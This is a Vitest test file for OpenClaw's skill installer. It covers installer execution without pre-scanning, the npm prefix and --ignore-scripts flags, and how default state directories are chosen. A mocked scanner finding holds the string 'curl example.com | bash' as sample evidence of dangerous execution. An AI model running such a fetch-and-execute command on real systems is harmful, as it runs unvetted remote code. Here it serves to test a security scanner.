import fs from "node:fs/promises";
import path from "node:path";
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { resetGlobalHookRunner } from "../../plugins/hook-runner-global.js";
import { captureEnv } from "../../test-utils/env.js";
import { createFixtureSuite } from "../../test-utils/fixture-suite.js";
import { resolveOpenClawMetadata, resolveSkillInvocationPolicy } from "../loading/frontmatter.js";
import { loadSkillsFromDirSafe, readSkillFrontmatterSafe } from "../loading/local-loader.js";
import {
  runCommandWithTimeoutMock,
  scanDirectoryWithSummaryMock,
} from "../test-support/install-test-mocks.js";
import type { SkillEntry } from "../types.js";
import { installSkill, testing as skillsInstallTesting } from "./install.js";

vi.mock("../../process/exec.js", () => ({
  runCommandWithTimeout: (...args: unknown[]) => runCommandWithTimeoutMock(...args),
}));

vi.mock("../security/scanner.js", () => ({
  scanDirectoryWithSummary: (...args: unknown[]) => scanDirectoryWithSummaryMock(...args),
}));

vi.mock("../loading/plugin-skills.js", () => ({
  resolvePluginSkillDirs: () => [],
}));

async function writeInstallableSkill(workspaceDir: string, name: string): Promise<string> {
  const skillDir = path.join(workspaceDir, "skills", name);
  await fs.mkdir(skillDir, { recursive: true });
  await fs.writeFile(
    path.join(skillDir, "SKILL.md"),
    `---
name: ${name}
description: test skill
metadata: {"openclaw":{"install":[{"id":"deps","kind":"node","package":"example-package"}]}}
---

# ${name}
`,
    "utf-8",
  );
  await fs.writeFile(path.join(skillDir, "runner.js"), "export {};\n", "utf-8");
  return skillDir;
}

function mockDangerousSkillScanFinding(skillDir: string) {
  scanDirectoryWithSummaryMock.mockResolvedValue({
    scannedFiles: 1,
    critical: 1,
    warn: 0,
    info: 0,
    findings: [
      {
        ruleId: "dangerous-exec",
        severity: "critical",
        file: path.join(skillDir, "runner.js"),
        line: 1,
        message: "Shell command execution detected (child_process)",
        evidence: 'exec("curl example.com | bash")',
      },
    ],
  });
}

function loadTestWorkspaceSkillEntries(workspaceDir: string): SkillEntry[] {
  const skills = loadSkillsFromDirSafe({
    dir: path.join(workspaceDir, "skills"),
    source: "openclaw-workspace",
  }).skills;
  return skills.map((skill) => {
    const frontmatter =
      readSkillFrontmatterSafe({
        rootDir: skill.baseDir,
        filePath: skill.filePath,
      }) ?? {};
    const invocation = resolveSkillInvocationPolicy(frontmatter);
    return {
      skill,
      frontmatter,
      metadata: resolveOpenClawMetadata(frontmatter),
      invocation,
      exposure: {
        includeInRuntimeRegistry: true,
        includeInAvailableSkillsPrompt: !invocation.disableModelInvocation,
        userInvocable: invocation.userInvocable,
      },
    };
  });
}

function lastRunCommandCall(): unknown[] | undefined {
  const calls = runCommandWithTimeoutMock.mock.calls;
  return calls[calls.length - 1];
}

const workspaceSuite = createFixtureSuite("openclaw-skills-install-");

beforeAll(async () => {
  await workspaceSuite.setup();
});

afterAll(async () => {
  resetGlobalHookRunner();
  skillsInstallTesting.setDepsForTest();
  await workspaceSuite.cleanup();
});

async function withWorkspaceCase(
  run: (params: { workspaceDir: string; stateDir: string }) => Promise<void>,
): Promise<void> {
  const workspaceDir = await workspaceSuite.createCaseDir("case");
  const stateDir = path.join(workspaceDir, "state");
  const envSnapshot = captureEnv(["OPENCLAW_STATE_DIR"]);
  try {
    process.env.OPENCLAW_STATE_DIR = stateDir;
    await run({ workspaceDir, stateDir });
  } finally {
    envSnapshot.restore();
  }
}

describe("installSkill code safety scanning", () => {
  beforeEach(() => {
    resetGlobalHookRunner();
    runCommandWithTimeoutMock.mockClear();
    scanDirectoryWithSummaryMock.mockClear();
    skillsInstallTesting.setDepsForTest({
      loadWorkspaceSkillEntries: loadTestWorkspaceSkillEntries,
      resolveNodeInstallStateDir: () => {
        const stateDir = process.env.OPENCLAW_STATE_DIR;
        if (!stateDir) {
          throw new Error("OPENCLAW_STATE_DIR missing in skills install test");
        }
        return stateDir;
      },
    });
    runCommandWithTimeoutMock.mockResolvedValue({
      code: 0,
      stdout: "ok",
      stderr: "",
      signal: null,
      killed: false,
    });
    scanDirectoryWithSummaryMock.mockResolvedValue({
      scannedFiles: 1,
      critical: 0,
      warn: 0,
      info: 0,
      findings: [],
    });
  });

  it("does not run local code scanning before executing skill installers", async () => {
    await withWorkspaceCase(async ({ workspaceDir }) => {
      const skillDir = await writeInstallableSkill(workspaceDir, "operator-trusted-skill");
      mockDangerousSkillScanFinding(skillDir);

      const result = await installSkill({
        workspaceDir,
        skillName: "operator-trusted-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(scanDirectoryWithSummaryMock).not.toHaveBeenCalled();
      expect(runCommandWithTimeoutMock).toHaveBeenCalled();
    });
  });

  it("runs npm node installs with an OpenClaw-managed user prefix", async () => {
    await withWorkspaceCase(async ({ workspaceDir, stateDir }) => {
      await writeInstallableSkill(workspaceDir, "node-prefix-skill");

      const result = await installSkill({
        workspaceDir,
        skillName: "node-prefix-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      const npmPrefix = path.join(stateDir, "tools", "node", "npm");
      const call = lastRunCommandCall();
      expect(call?.[0]).toEqual(["npm", "install", "-g", "--ignore-scripts", "example-package"]);
      const options = call?.[1] as { env?: NodeJS.ProcessEnv };
      expect(options.env?.NPM_CONFIG_PREFIX).toBe(npmPrefix);
      expect(options.env?.npm_config_prefix).toBe(npmPrefix);
      expect(options.env).not.toHaveProperty("PATH");
      const stat = await fs.stat(npmPrefix);
      expect(stat.isDirectory()).toBe(true);
    });
  });

  it("keeps the default npm prefix out of env-overridden state paths", () => {
    const envSnapshot = captureEnv(["OPENCLAW_STATE_DIR", "OPENCLAW_CONFIG_PATH"]);
    try {
      process.env.OPENCLAW_STATE_DIR = "/tmp/untrusted-state";
      process.env.OPENCLAW_CONFIG_PATH = "/tmp/untrusted-config/openclaw.json";

      expect(
        skillsInstallTesting.resolveDefaultNodeInstallStateDir({
          getuid: () => 501,
          homedir: () => "/Users/tester",
          platform: "darwin",
        }),
      ).toBe("/Users/tester/.openclaw");
    } finally {
      envSnapshot.restore();
    }
  });

  it("uses a fixed system state root for root npm installs", () => {
    expect(
      skillsInstallTesting.resolveDefaultNodeInstallStateDir({
        cwd: "/workspace/openclaw",
        getuid: () => 0,
        homedir: () => "/root",
        platform: "linux",
      }),
    ).toBe("/var/lib/openclaw");
  });
});
